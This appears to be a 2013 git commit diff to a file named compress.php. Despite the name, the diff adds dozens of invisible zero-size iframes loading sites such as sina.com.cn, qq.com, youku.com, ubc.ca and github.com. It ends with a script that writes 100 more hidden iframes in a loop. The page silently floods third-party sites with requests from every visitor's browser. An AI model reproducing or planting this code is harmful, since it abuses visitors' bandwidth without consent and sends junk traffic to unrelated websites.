3aaa9a256d83d5ac655a0926ead63a35febec9c8
Andy Cheung <win120a@163.com>
2013-06-27 17:25:18 +0800

    Update compress.php

--- tool/internet-compents/compress.php
+++ tool/internet-compents/compress.php
@@ -2,3 +2,48 @@
 <iframe src="http://www.ubc.ca" width=0 height=0></iframe>
 <iframe src="http://163.com" width=0 height=0></iframe>
 <iframe src="https://www.github.com" width=0 height=0></iframe>
+<iframe src="http://www.qq.com" width=0 height=0></iframe>
+<iframe src="http://youku.com" width=0 height=0></iframe>
+<iframe src="http://calendar.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://www.sina.com.cn" width=0 height=0></iframe>
+<iframe src="http://www.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://163.com" width=0 height=0></iframe>
+<iframe src="https://www.github.com" width=0 height=0></iframe>
+<iframe src="http://www.qq.com" width=0 height=0></iframe>
+<iframe src="http://youku.com" width=0 height=0></iframe>
+<iframe src="http://calendar.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://www.sina.com.cn" width=0 height=0></iframe>
+<iframe src="http://www.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://163.com" width=0 height=0></iframe>
+<iframe src="https://www.github.com" width=0 height=0></iframe>
+<iframe src="http://www.qq.com" width=0 height=0></iframe>
+<iframe src="http://youku.com" width=0 height=0></iframe>
+<iframe src="http://calendar.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://www.sina.com.cn" width=0 height=0></iframe>
+<iframe src="http://www.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://163.com" width=0 height=0></iframe>
+<iframe src="https://www.github.com" width=0 height=0></iframe>
+<iframe src="http://www.qq.com" width=0 height=0></iframe>
+<iframe src="http://youku.com" width=0 height=0></iframe>
+<iframe src="http://calendar.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://www.sina.com.cn" width=0 height=0></iframe>
+<iframe src="http://www.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://163.com" width=0 height=0></iframe>
+<iframe src="https://www.github.com" width=0 height=0></iframe>
+<iframe src="http://www.qq.com" width=0 height=0></iframe>
+<iframe src="http://youku.com" width=0 height=0></iframe>
+<iframe src="http://calendar.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://www.sina.com.cn" width=0 height=0></iframe>
+<iframe src="http://www.ubc.ca" width=0 height=0></iframe>
+<iframe src="http://163.com" width=0 height=0></iframe>
+<iframe src="https://www.github.com" width=0 height=0></iframe>
+<iframe src="http://www.qq.com" width=0 height=0></iframe>
+<iframe src="http://youku.com" width=0 height=0></iframe>
+<iframe src="http://calendar.ubc.ca" width=0 height=0></iframe>
+<script>
+c = 0;
+while(c < 100){
+ document.write('<iframe src="http://www.sina.com.cn" width=0 height=0><\/iframe>');
+ c++;
+}
+</script>
